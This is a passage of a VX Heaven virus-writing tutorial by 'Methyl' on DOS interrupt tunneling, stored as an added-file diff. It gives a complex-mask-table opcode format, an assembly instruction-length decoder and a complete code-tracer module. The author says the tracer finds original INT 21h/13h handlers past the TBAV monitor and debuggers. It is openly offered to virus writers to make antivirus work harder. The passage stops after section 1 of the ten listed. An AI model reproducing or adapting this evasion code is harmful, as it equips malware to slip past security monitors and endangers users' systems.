@@ -1,0 +1,1156 @@
+<?xml version="1.0"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<title> Methyl 'Tunneling via Mini-Tunnelers' (VX heaven)</title>
+<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+<meta name="Author" content="Methyl"/>
+<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, Methyl,Tunneling via Mini-Tunnelers, tracer, stack, plug, kernel, orig, call, bios, decoder, scanning, temp, push, instruction, begin, stealth, opcode"/>
+<meta name="Description" content="How about a new code tracing engine thatactually works as well as being smaller than the old one, as WELL as using the new CMT format as WELL as having commented source code that even -YOU- could understand?!?!  How about i2a trapping, i20 and CP/M exploitation, and kernel scanning?  All those and more await you in this document!"/>
+<script type="text/javascript">
+//<![CDATA[
+try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"b39ba02e9a8c11c8d24ed35d6f8553b5775e1178-1498758185-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
+//]]>
+</script>
+<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vme02.html"/>
+<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
+</head>
+<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
+<div class="s1">
+<h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
+<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
+</div>
+<div><div style="float:right;"><a href="/lib/index.php?tbs=0"><img src="/img/min.gif" alt="Minimize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
+<div style="float: right;"><div id="plusone"></div></div>
+<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
+<div style="float: right;" class="addthis_toolbox addthis_default_style">
+<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
+<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
+<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
+</div>
+<div style="float: left;">
+<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
+<form action="/search.php" id="cse-search-box">
+<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
+<input type="hidden" name="cof" value="FORID:10"/>
+<input type="hidden" name="ie" value="UTF-8"/>
+<input type="text" name="q" size="32" value=" "/>
+<input type="submit" name="sa" value="Search"/>
+</form>
+</div><br clear="both"/></div>
+<div class="s2"><h1>Tunneling via Mini-Tunnelers</h1><p><a href="/lib/?lang=en&amp;author=Methyl"> Methyl</a><br/></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vme02.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=DO#vme02">Back to index</a>] [<a href="/lib/vme02.html#disqus_thread">Comments</a>]<br/> 
+<ul>
+<li><a href="#p1">Section 1: Complex Mask Tables v2.0</a></li>
+<li><a href="#p2">Section 2: INT 2A trapping</a></li>
+<li><a href="#p3">Section 3: Grabbing i13 from the DOS kernel</a></li>
+<li><a href="#p4">Section 4: DOS kernel scanning for i13</a></li>
+<li><a href="#p5">Section 5: DOS terminate backdoor</a></li>
+<li><a href="#p6">Section 6: CP/M utilization</a></li>
+<li><a href="#p7">Section 7: Uuuuuh, SFT tunneler?</a></li>
+<li><a href="#p8">Section 8: Double-NOP scanning</a></li>
+<li><a href="#p9">Section 9: Other tidbits</a></li>
+<li><a href="#pa">Section 10: Conclusion</a></li>
+</ul>
+<h2>The curse</h2>
+<p>This document has been sealed by an evil, ancient egyption curse... anyone reading this text may have their flesh liquify and drip off their bones. Hey, don't let some bothersome flesh-dripping stop you from reading this document, the curse only applies if you haven't read the first two documents in my series on tunneling, the ones before this one, which is the third. Of course, if you -HAVEN'T- read the first two, which cover single stepping and code tracing... well then... you better get reading, don't you think?</p>
+<h2>Introduction</h2>
+<p>So, you think you are an ace, and you are beginning to wonder what this third document could possible be about, since you think you know everything there is to tunneling already. As if single stepping and the primitive form of code tracer I taught you to code... is all there is in the world of tunneling.</p>
+<p>Yes human, it is time to face the facts, you are only halfway along the road of tunneling genius, in need to progress past your pathetic self destructive existence as a human being, into the higher realm of extra terrestrial intelligence.</p>
+<p>What can you learn from extra terrestrials? How about a form of complex mask table and decoder that compile to HALF THE SIZE OF THE OLD ONES, and can -ALSO- be used in emulation systems? How about a new code tracing engine that actually works as well as being smaller than the old one, as WELL as using the new CMT format as WELL as having commented source code that even -YOU- could understand?!?! How about i2a trapping, i20 and CP/M exploitation, and kernel scanning? All those and more await you in this document!</p>
+<p>In an effort to make the world of the virus writer a better place, and to make the world of the AV a little tougher, I have struck up a deal with the aliens which allows me to release these tunneling concepts to the general public. In trade, I've had to help them with the coding of code emulation tunneling systems... mwahahaha.</p>
+<h2><a name="p1">Section 1: Complex Mask Tables v2.0</a></h2>
+<p>Yes, complex mask tables are back, and they, with the help of the higher beings, are even better than before! After having many talks with the aliens, a new structure for CMT tables was created, as well as a new format for the CMT entries themselves. We also created a new CMT decoder system, and increased the functionality of the CMT system to allow rudimentary handling of emulation systems!</p>
+<p>However, before we go into the new CMT format, there's something you need to know. Do you remember my code tracer from document #2... which never seemed to work on anyone's system except mine, and even then, not very often? Well, I can now tell you, that this is NOT a problem with code tracing, it was simply because of a bug in CMT's!!!!</p>
+<p>That's right, you can throw the old version of CMT's out of the window, the old example tables I created are absolutely useless, chock full of bugs so chumpy you could carve them. Of course, I didn't realise this until I began work on beta copies of 8086 emulation systems... which led to the creation of the new form of CMT's you're about to see. Basically, although the old CMT design was good in theory, the example tables you saw (the big list of 1's and 0's) were all wrong.</p>
+<p>How can I say that these typographical errors won't crop up again? Well, I can't. However, I -CAN- tell you that the new CMT 2.0 format reduces the risk of errors such as the ones I made... but it comes with alot of other features as well that make them superior to the old format... which you'll learn about as we go along. Anyway, enough self-congratulatory text... here's the design structure of the new CMT 2.0 format.</p>
+<pre>    
+   -------------------------------------------------------------------------------
+   |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+    
+       Layout of table entry:   Size    Description
+                               '----'  '-----------'
+                                byte    Field descriptor byte
+                                byte    MASK
+                                word    Handling routine if needed
+                                byte    CMP value
+    
+       Field descriptor byte:   |x|6|5|4|3|2|1|0|
+                                | | | | | |     |
+                                '-'-'-'-'-'-----'
+                                   | | | |   '----------------.
+                                   | | | |                    ^
+                                   | | | |   Length of instruction OR the number
+                                   | | | |   to add to instruction length after
+                .------------------' | | |   the other decodings
+                ^                    | | '--------------------.
+     0 = Don't use last bitfields    | |                      ^
+     1 = Use last bitfields          | |     0 = Don't use MODR/M routines
+                                     | |     1 = Use MODR/M routines
+                .--------------------' '----------------------.
+                ^                                             ^
+     0 = Last bitfields are xxxxxxxX            0 = Opcode is not special
+     1 = Last bitfields are xxxxxxXX            1 = Opcode needs special handler
+    
+   |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+   -------------------------------------------------------------------------------
+</pre>
+<p>That's the new design specifications... they look a little daunting at first but you'll get used to them :) They are actually so much easier to use than the CMT 1.0 format. Anyway, before I go into how these tables operate, I'll discuss what some of the major changes between CMT formats 1.0 and 2.0 are, and why I made them.</p>
+<p>First of all, in the CMT 1.0 format, it was annoying to me that the decoder needed to handle two different types of table entry, word sized and byte sized, making the decoder twice the size it should have been. As such, I took out the word size entries for the CMT 2.0 format. Also, the new CMT 2.0 format doesn't have to handle multiple CMP values per MASK... which also decreases decoder size and complexity greatly.</p>
+<p>Finally, the biggest change was how the CMT method actually works. Before, you had to pre-calculate the length of every variation of instruction... which would lead to hard to track down bugs when you type a 1 instead of a 0 in the tables by accident. To combat this, in the new CMT 2.0 format, the decoder actually calculates the length of instructions on the fly! Of course you still have to enter opcode information, but whats needed now is nothing compared to what was needed before.</p>
+<p>Opcode length can generally be determined by putting an opcode through 4 phases, each which add to the total opcode length along the way. However, all the opcodes only have to go through certain combinations of phases, hence the table entries, which tell the decoder which phases the opcode needs to go through to calculate the full instruction length.</p>
+<p>The first 2 phases are for special opcodes with immediate data following them. These opcodes specify wether the immediate data following is a byte or word by using the last bit of their opcode... if it is clear, then immediate byte data follows, and if it is set, immediate word data follows. Some instructions use the last TWO bits to specify immediate data length just as before, and handling these is the second phase of the decoder. Which of these phases, if any, an opcode needs to go through are marked by the 5th and 6th bits in the field descriptor byte. The bit/data ratios are as follows:</p>
+<table border="1" cellspacing="0" cellpadding="0" summary="The bit/data ratios">
+<tr><td>00</td><td>byte immediate follows instruction</td></tr>
+<tr><td>01</td><td>word immediate follows instruction</td></tr>
+<tr><td>10</td><td>byte immediate follows instruction</td></tr>
+<tr><td>11</td><td>byte immediate follows instruction</td></tr>
+</table>
+<p>The third decoder phase is MODR/M handling. Many opcodes are in a set structure called the MODR/M format. These instructions can have part of their length determined by the same MODR/M routine. If the 3rd bit is set in the field descriptor byte, the CMT decoder passes the opcode through its MODR/M handler to calculate part of the instruction length.</p>
+<p>The fourth decoder phase is the addition to the current instruction length (as built up by the past 3 phases), of the number countained in last 3 bits of the field descriptor byte. The reason for this is that sometimes, instructions are a fixed length and don't need to go through any of the other 3 phases... so you just set the field descriptor byte to not go through any of the phases and set the last 3 bits to the full instruction length. Also, some instructions need a constant number to be added to their length once other decodings have been completed to get the full instruction length. If an instruction doesn't need any more values added to it, such as if it is just a straight MODR/M instruction, the last 3 bitfields can be set to zero, nulling the effect of the 4th phase.</p>
+<p>Oh, and there is one more thing I haven't mentioned yet... the special opcode flag. The special opcode flag was designed for usage in emulation systems, however it can allow small space savings in code tracers as well. As you may remember from the code tracer in document #2, we had to strain off many opcodes before they reached the CMT tables, using dedicated routines to handle them. Examples of these opcodes are segment override prefixes, JMP and CALL instructions, etc.</p>
+<p>To do this, we generally had to mask the opcode and compare the result against the signature of the opcode we are checking for, jumping to the special handling routine if we get a match. However, this is basically exactly what CMT tables were designed for, masking and comparing. With the new CMT 2.0 format, the decoder can return to you an address you need to call for special opcodes, reducing the size of your code tracing engines as there is no longer a need for long drawn out sets of PUSH/AND/CMP/POP/JE... this should also make your source code alot more readable.</p>
+<p>Are there any disadvantages in the new CMT 2.0 format? Well, only one, in that they -CANNOT- handle any 286 or higher opcodes. This problem will be handled in the CMT 3.0 definition, which is currently in the works for a later document. Until document #4 when the CMT 3.0 definition is released, this table definition should last you for quite a while. Time to see the CMT 2.0 instruction database.</p>
+<pre class="source">
+   -------------------------------------------------------------------------------
+   |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+    
+   instruction_struc struc
+    
+       ; AAA/AAS/DAA/DAS
+       db 00000001b
+       db 11100111b
+       db 00100111b
+    
+       ; AAD/AAM
+       db 00000010b
+       db 11111110b
+       db 11010100b
+    
+       ; BOUND
+       db 00001000b
+       db 11111111b
+       db 01100010b
+    
+       ; CBW/CWD/POPF/PUSHF/SAHF/LAHF/WAIT/CALL FAR OFF:SEG
+       ; XCHG accumulator with register
+       db 00000001b
+       db 11110000b
+       db 10010000b
+    
+       ; CLD/STD/CMC/HLT
+       db 00000001b
+       db 11110110b
+       db 11110100b
+    
+       ; CLI/STI/CLC/STC
+       db 00000001b
+       db 11111100b
+       db 11111000b
+    
+       ; CS/DS/ES/SS overrides
+       db 00010001b
+       db 11100111b
+       dw tracer_override
+       db 00100110b
+    
+       ; JMP conditional
+       db 00010010b
+       db 11110000b
+       dw tracer_conditional_jump
+       db 01110000b
+    
+       ; JMP short
+       db 00010010b
+       db 11111111b
+       dw tracer_jmp_short
+       db 11101011b
+    
+       ; LOCK/REP[N[E]]
+       db 00000001b
+       db 11111100b
+       db 11110000b
+    
+       ; CMPS/MOVS/LODS/SCAS
+       db 00000001b
+       db 11110100b
+       db 10100100b
+    
+       ; DEC|INC|PUSH|POP register
+       db 00000001b
+       db 11100000b
+       db 01000000b
+    
+       ; INT 3 | INTO
+       db 00000001b
+       db 11111101b
+       db 11001100b
+    
+       ; IRET
+       db 00010000b
+       db 11111111b
+       dw tracer_ret_far
+       db 11001111b
+    
+       ; RETN|F
+       db 00010000b
+       db 11110110b
+       dw tracer_ret_far
+       db 11000010b
+    
+       ; INT variable
+       db 00000010b
+       db 11111111b
+       db 11001101b
+    
+       ; PUSH|POP segment register
+       db 00000001b
+       db 11100110b
+       db 00000110b
+    
+       ; ENTER
+       db 00000100b
+       db 11111111b
+       db 11001000b
+    
+       ; LEAVE
+       db 00000001b
+       db 11111111b
+       db 11001001b
+    
+       ; LOOP series and JCXZ
+       db 00010010b
+       db 11111100b
+       dw tracer_jmp_short
+       db 11100000b
+    
+       ; XCHG/TEST/LEA/POP register/memory
+       ; MOV segment register with register/memory
+       db 00001000b
+       db 11110100b
+       db 10000100b
+    
+       ; PUSHA and POPA
+       db 00000001b
+       db 11111110b
+       db 01100000b
+    
+       ; IN/OUT variable port
+       db 00000001b
+       db 11111100b
+       db 11101100b
+    
+       ; IN/OUT fixed port
+       db 00000010b
+       db 11111100b
+       db 11100100b
+    
+       ; STOS
+       db 00000001b
+       db 11111110b
+       db 10101010b
+    
+       ; XLAT
+       db 00000001b
+       db 11111111b
+       db 11010111b
+    
+       ; ESC
+       db 00001000b
+       db 11111000b
+       db 11011000b
+    
+       ; LDS/LES
+       db 00001000b
+       db 11111110b
+       db 11000100b
+    
+       ; MOV register/memory with register
+       db 00001000b
+       db 11111100b
+       db 10001000b
+    
+       ; MOV memory with accumulator
+       db 00000011b
+       db 11111100b
+       db 10100000b
+    
+       ; MOV register with immediate byte
+       db 00000010b
+       db 11111000b
+       db 10110000b
+    
+       ; MOV register with immediate word
+       db 00000011b
+       db 11111000b
+       db 10111000b
+    
+       ; TEST accumulator with immediate
+       db 01000001b
+       db 11111110b
+       db 10101000b
+    
+       ; ADC|ADD|AND|CMP|OR|SBB|SUB|XOR register/memory with register
+       db 00001000b
+       db 11000100b
+       db 00000000b
+    
+       ; RCR|RCL|ROR|ROL|SHR|SHL|SAR|SAL register/memory with 1 or CL
+       db 00001000b
+       db 11111100b
+       db 11010000b
+    
+       ; RCR|RCL|ROR|ROL|SHR|SHL|SAR|SAL register/memory with immediate
+       db 00001001b
+       db 11111110b
+       db 11000000b
+    
+       ; ADC|ADD|AND|CMP|OR|SBB|SUB|XOR register/memory with immediate
+       db 01101000b
+       db 11111100b
+       db 10000000b
+    
+       ; MOV register/memory with immediate
+       db 01001000b
+       db 11111110b
+       db 11000110b
+    
+       ; ADC|ADD|AND|CMP|OR|SBB|SUB|XOR accumulator with immediate
+       db 01000001b
+       db 11000110b
+       db 00000100b
+    
+   ; F6 - test, ???, not, neg, mul, imul, div, idiv  b's
+   ; F7 - test, ???, not, neg, mul, imul, div, idiv  w's
+   ; FE - inc, dec, callin, callif, jmpin, jmpif, push, ???
+   ; FF - inc, dec, callin, callif, jmpin, jmpif, push, ???
+   ; Note that the TEST instruction is handled incorrectly in here, but properly
+   ; fixed up in the CMT decoder
+   ;
+       db 00011000b
+       db 11110110b
+       dw tracer_indirect
+       db 11110110b
+    
+       end_of_table equ $
+       ends
+    
+   instruction_table instruction_struc &lt;>
+                               ; our new complex mask table
+    
+   |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+   -------------------------------------------------------------------------------
+</pre>
+<p>As you can see, the database for the CMT 2.0 format looks alot cleaner and uncluttered than the ones presented in document #2 for the CMT 1.0 format. But this cleaner look is not only pleasing to the eye, it has the added advantage of being easier to read, so you can add entries and check for bugs alot easier than in the CMT 1.0 database. So, now that you have the example table and formal definition, it is time to show you the new and improved CMT 2.0 decoder!</p>
+<pre class="source">
+   -------------------------------------------------------------------------------
+   |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+    
+   ; Registers modified: AX, BX, CX, DX, SI, BP
+   ; Requires:           AX holds opcode to scan through table
+   ;                     Segment of CMT database in DS
+   ; Returns on failure: BL=1
+   ; Returns on success: BL=0
+   ;                     AX=instruction length
+   ;                     BP=address to give control to if dedicated routine
+   ;                        needed, or 0 if no dedicated routine needed
+   ;
+   decoder proc near
+           lea si, [instruction_table-1]
+           mov dx, ax                      ; DX holds the virgin opcode through
+                                           ; the entire routine
+   decoder_main:
+           xor bp, bp
+           inc si
+           cmp si, offset instruction_table.end_of_table
+           jne decoder_valid       ; make sure we don't go off past the
+                                           ; end of the table
+   decoder_invalid:
+           mov bl, 1                       ; BL = failure code
+           ret                             ; exit decoder
+    
+   decoder_valid:
+           mov ax, dx                      ; reload AX with current opcode
+           mov bl, ds:[si]                 ; get status word in BL
+           mov bh, bl                      ; make a copy
+           and al, ds:[si+1]               ; mask opcode against table entry
+           inc si
+           inc si
+           test bl, 10000b
+           je decoder_not_special          ; no special routine needed
+           mov bp, ds:[si]                 ; grab routine address
+           inc si
+           inc si                          ; adjust DS:SI pointer
+   decoder_not_special:
+           cmp al, ds:[si]                 ; check masked opcode against CMP value
+           jne decoder_main                ; no match, so restart with next entry
+    
+           ; there is a bug in my tables which makes it so you have to set a
+           ; bit in the field descriptor byte if a TEST B/TEST W instruction is
+           ; encountered
+           mov ax, dx
+           and ax, 11100011111110b
+           cmp ax, 00000011110110b
+           jne decoder_notest
+           or bh, 1000000b
+    
+   decoder_notest:
+           ; now we need to work out the opcode length... using the status bits
+           ; still held intact in BH (our BL copy was destroyed earlier)... note
+           ; that CL holds the end instruction length throughout this section
+    
+           ; first we need the beginning length of the instruction
+           mov al, bh
+           and al, 111b
+           mov cl, al                      ; this is added/used as instruction
+                                           ; length no matter what the rest of the
+                                           ; bitfields say
+    
+           ; next we handle the 'last bitfields' section
+           mov al, bh
+           and al, 1000000b
+           jz decoder_nobits       ; we're not supposed to use the bits
+    
+           mov ax, dx                      ; get current opcode back
+           and al, 1
+           inc al
+           add cl, al                      ; increase accordingly
+           mov al, bh
+           and al, 100000b
+           jz decoder_nobits
+           mov ax, dx                      ; get current opcode back
+           and al, 11b
+           cmp al, 11b
+           jne decoder_nobits
+           dec cl                          ; decrease accordingly
+    
+   decoder_nobits:
+           ; now that we have the beginning length, we check to see if this
+           ; entry uses MODR/M
+           mov al, bh
+           and al, 1000b
+           jz decoder_nomodrm
+    
+           ; if we do use MODR/M... the shit really hits the fan here
+           add cl, 2                       ; we add 2 by default since the opcode
+                                           ; is at least 2 bytes long (identifier
+                                           ; plus MODR/M byte)
+           mov ax, dx                      ; get current opcode back
+           and ah, 11000111b
+           cmp ah, 110b
+           je decoder_add_two      ; we just add 2 for straight memory access
+           and ah, 11000000b
+           jz decoder_nomodrm      ; we add nothing
+           cmp ah, 01000000b
+           je decoder_add_one      ; we just add a byte displacement here
+           cmp ah, 11000000b
+           je decoder_nomodrm      ; we add nothing here either
+    
+   decoder_add_two:
+           inc cl
+   decoder_add_one:
+           inc cl
+   decoder_nomodrm:
+           mov ch, 0
+           mov ax, cx                      ; AX = instruction length
+           mov bl, 0                       ; BL = success
+           ret                             ; leave decoder
+   decoder endp
+    
+   |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+   -------------------------------------------------------------------------------
+</pre>
+<p>Once again, the new decoder is much more efficient than the last one, and is also alot smaller and easier to understand as well ;) Of course, it also has the advantage that it works with the CMT 2.0 format, hehehe, and being easier to understand is probably just because I actually commented it and set the source out nicely (well, compared to the CMT 1.0 decoder at least, heh).</p>
+<p>Anyway, being the bloodsucking assho... uuuh, I mean, inquisitive human being that you are... you are probably wanting to see some results on how the new tables work. What better way to show you than with a new code tracer module that you can test for yourself? This new version takes full advantage of the features of the CMT 2.0 format, while fixing up a few bugs in the old decoder.</p>
+<pre class="source"> 
+   -------------------------------------------------------------------------------
+   |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+    
+   override       db 02eh  ; current segment override
+   loop_counter   dw 0300h ; local abort counter
+   global_counter dw 0     ; global abort counter
+   temp_ip        dw 0     ; temporary storage for stack searching
+   temp_store     dw 0, 0  ; temporary storage for stack searching
+   stack_top      dw 0     ; do not POP past this point
+   stack_bottom   dw 0     ; do not PUSH past this point
+    
+   tracer proc near
+       push cs
+       pop ds
+       mov ds:[stack_top], sp          ; setup stack
+       mov ax, offset program_end+40h  ; smaller than lea ax, [program_end+40h]
+       mov ds:[stack_bottom], ax       ; assuming we're running from a COM file,
+                                       ; we shouldn't push past this point
+       mov ax, 03521h
+       int 021h                ; get i21 address
+       xchg bx, di             ; into ES:DI
+       push ax
+       push ax
+       push ax                 ; fixup stack (push fake CALL)
+   tracer_begin:
+       mov ds:[override], 02eh ; clear overrides
+   tracer_skip_prefix:
+       xor si, si
+       mov ax, es
+       cmp ax, ds:[first_mcb]
+       jb tracer_success       ; check for DOS segment
+       dec ds:[loop_counter]
+       jz tracer_ret_far       ; do another path if this path has led nowhere
+       dec ds:[global_counter]
+       jz tracer_error         ; exit if too many global passes
+       cmp di, 0fff0h
+       jb check_opcode         ; everything is okay, handle opcodes
+   tracer_ret_far:             ; do another path as this has gone too long
+       mov ax, sp
+       add ax, 6
+       cmp ax, ds:[stack_top]
+       jae tracer_error        ; make sure we don't pop too much off the stack
+       pop di
+       pop es
+       pop ds:[loop_counter]
+       jmp tracer_begin        ; do RETF and return to main handler
+    
+   tracer_error:
+       inc si
+   tracer_success:
+       mov sp, ds:[stack_top]
+       ret                     ; exit tunneler
+    
+   tracer_override:
+       mov bl, es:[di]
+       mov ds:[override], bl
+       add di, ax
+       jmp tracer_skip_prefix  ; handles segment overrides
+    
+   tracer_conditional_jump:
+       mov ax, di
+       inc ax
+       inc ax
+       call tracer_call_finish ; push address after conditional jump onto the
+                               ; stack
+   tracer_jmp_short:
+       mov al, es:[di+1]
+       cbw
+       add di, ax
+       inc di
+       inc di
+       jmp tracer_begin        ; do jump short and return to trace
+    
+   tracer_indirect:
+       xchg ax, bx             ; save opcode length
+       mov ax, es:[di]
+       cmp al, 0feh
+       jb tracer_not_indirect  ; make sure it's within the right range
+       and ah, 11000111b
+       mov cl, ah              ; save MODR/M information, if there is an indirect
+                               ; reference then CX!=110
+       cmp ds:[override], 2eh
+       je tracer_indirect_next
+       inc cx                  ; sets CX!=0 if a non-CS override encountered
+   tracer_indirect_next:
+       mov ax, es:[di]
+       and ah, 111000b
+       cmp ah, 10000b
+       je tracer_call_near_mem ; CALL [X]
+       cmp ah, 11000b
+       je tracer_call_far_mem  ; CALL FAR [X]
+       cmp ah, 100000b
+       je tracer_jmp_near_mem  ; JMP [X]
+       cmp ah, 101000b
+       je tracer_jmp_far_mem   ; JMP FAR [X]
+    
+   tracer_not_indirect:
+       xchg bx, ax             ; restore opcode length
+       jmp generic_opcode      ; it's a normal opcode so handle it normally
+    
+   check_opcode:
+       mov ax, es:[di]
+           ; although the following opcode checks could be in the CMT, it is
+           ; smaller to handle them directly
+       cmp al, 0e9h
+       je tracer_jmp_near_immed    ; JMP WORD PTR X
+       cmp al, 0eah
+       je tracer_jmp_far_immed     ; JMP DWORD PTR X:X
+       cmp al, 0e8h
+       je tracer_call_near_immed   ; CALL WORD PTR X
+       cmp al, 9ah
+       je tracer_call_far_immed    ; CALL DWORD PTR X:X
+       push si
+       call decoder                ; get length of opcode in AX... destroys SI
+       pop si                      ; which is why we save/restore it
+       cmp bl, 1
+       je _tracer_ret_far          ; follow another path if invalid opcode found
+       cmp bp, 0
+       je generic_opcode           ; handle like a normal opcode
+       jmp bp                      ; use a dedicated procedure for this opcode
+   generic_opcode:
+       add di, ax                  ; DI=DI+Opcode Length
+       jmp tracer_begin            ; resume tracing
+    
+   tracer_call_near_mem:
+       call tracer_call_setup      ; make sure CALL doesn't overflow stack
+       add ax, 4
+       jc _tracer_ret_far
+       call tracer_call_finish     ; push address after CALL onto stack
+   tracer_jmp_near_mem:
+       cmp cl, 110b                ; exit if indirect memory access
+       jne _tracer_ret_far
+       mov di, es:[di+2]
+       mov di, es:[di]
+       jmp tracer_begin            ; resume tracing
+    
+   tracer_call_far_mem:
+       call tracer_call_setup      ; make sure CALL doesn't overflow stack
+       add ax, 5
+       jc _tracer_ret_far
+       call tracer_call_finish     ; push address after CALL onto stack
+   tracer_jmp_far_mem:
+       cmp cl, 110b                ; exit if indirect memory access
+       jne _tracer_ret_far
+       mov di, es:[di+2]
+       mov ax, es:[di+2]
+       mov di, es:[di]
+       mov es, ax
+       jmp tracer_begin            ; resume tracing
+    
+   tracer_call_near_immed:
+       call tracer_call_setup      ; make sure CALL doesn't overflow stack
+       add ax, 3
+       jc _tracer_ret_far
+       call tracer_call_finish     ; push address after CALL onto stack
+   tracer_jmp_near_immed:
+       add di, es:[di+1]
+       add di, 3
+       jmp tracer_begin            ; resume tracing
+    
+   tracer_call_far_immed:
+       call tracer_call_setup      ; make sure CALL doesn't overflow stack
+       add ax, 5
+       jc _tracer_ret_far
+       call tracer_call_finish     ; push address after CALL onto stack
+   tracer_jmp_far_immed:
+       mov ax, es:[di+3]
+       mov di, es:[di+1]
+       mov es, ax
+       jmp tracer_begin            ; resume tracing
+    
+   _tracer_ret_far:                ; so short jumps can
+       jmp tracer_ret_far          ; jump to tracer_ret_far
+   _tracer_error:                  ; so short jumps can
+       jmp tracer_error            ; jump to tracer_error
+    
+   ; if you are going to push 6 values (CS, IP, COUNTER) onto the stack, then this
+   ; routine makes sure the stack doesn't overflow... if it would overflow, then
+   ; the tracer aborts
+   tracer_call_setup:
+       pop bx
+       mov ax, sp
+       sub ax, 6                   ; AX=what SP will be after push's
+       cmp ax, ds:[stack_bottom]
+       jbe _tracer_error           ; abort if stack goes past limits
+       mov ax, di
+       push bx
+       ret
+    
+   ; this routine scans the stack for the address you are wanting to push onto
+   ; it... if it is not on there, the routine adds it to the stack, otherwise
+   ; it performs a RET FAR
+   tracer_call_finish:
+       pop ds:[temp_ip]            ; keeps the stack clear
+       mov ds:[temp_store], ax
+       mov ds:[temp_store+2], es   ; save ES and AX which are modified in the
+                                   ; routine
+       push ss
+       pop es
+       xchg bp, di                 ; save DI
+       mov di, sp                  ; ES:DI == SS:SP
+   tracer_call_loop:
+       mov ax, es:[di]
+       cmp ax, ds:[temp_store]
+       jne tracer_call_nomatch     ; jump if IP!=SS:[SP]
+       mov ax, es:[di+2]
+       cmp ax, ds:[temp_store+2]
+       je _tracer_ret_far          ; do RET FAR if CS:IP==SS:[SP]
+   tracer_call_nomatch:
+       add di, 6
+       cmp di, ds:[stack_top]
+       jb tracer_call_loop         ; loop until the stack is exhausted
+   tracer_call_exit:
+       push ds:[loop_counter]      ; push loop counter onto stack
+       mov ax, ds:[temp_store+2]
+       push ax                     ; push CS onto stack
+       push ds:[temp_store]        ; push IP onto stack
+       push ds:[temp_ip]           ; set return IP on stack
+       mov es, ax
+       xchg bp, di                 ; restore ES:DI (CS:IP)
+       ret                         ; return to caller
+   tracer endp
+    
+   |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+   -------------------------------------------------------------------------------
+</pre>
+<p>So how well does it work? Well, in theory, since it is using a practically bug free instruction database, and since it can handle 186 instructions now, it should have increased chances of tunneling interrupts properly, unless 286/386 opcodes are encountered, in which case it may sometimes go haywire, and sometimes it will not be hampered at all. In practice, on my system it can tunnel i21 past combinations of QEMM/TBAV/DESQVIEW/TD/S-ICE, so at least for ME it's stable.</p>
+<p>As for tunneling i13, well, I've got it to half work :) Unlike the first version in document #2, it can now tunnel i13 past SMARTDRV by skipping the 386 opcode path and taking another path with no such opcodes. The original version was supposed to do this as well, but didn't due to a bug :) Even if the bug wasn't there, it still wouldn't have worked due to the buggy CMT tables. Win95 does not use SMARTDRV I don't think, so I suppose my bugfix is redundant anyway since alot of people run Win95 :)</p>
+<p>Although it will generally tunnel i13 okay under normal systems... DESQView is a totally different pot of cheese. Under DESQView, the tunneler hangs the computer for about 6 seconds before returning an abort code. The DESQView i13 code is a MESS of conditional jumps and calls, which is somehow screwing up the internal logic of the code tracer. Sigh.</p>
